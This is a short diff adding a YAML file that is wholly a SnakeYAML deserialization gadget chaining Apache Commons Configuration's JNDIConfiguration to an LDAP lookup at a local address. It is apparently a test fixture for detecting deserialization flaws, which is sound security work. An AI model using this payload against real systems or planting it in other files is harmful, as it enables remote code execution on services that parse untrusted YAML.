@@ -1,0 +1,5 @@
+? !!org.apache.commons.configuration.ConfigurationMap
+- !!org.apache.commons.configuration.JNDIConfiguration
+   - !!javax.naming.InitialContext []
+   - "ldap://127.0.0.1:50389/8ebd8d"
+: 1
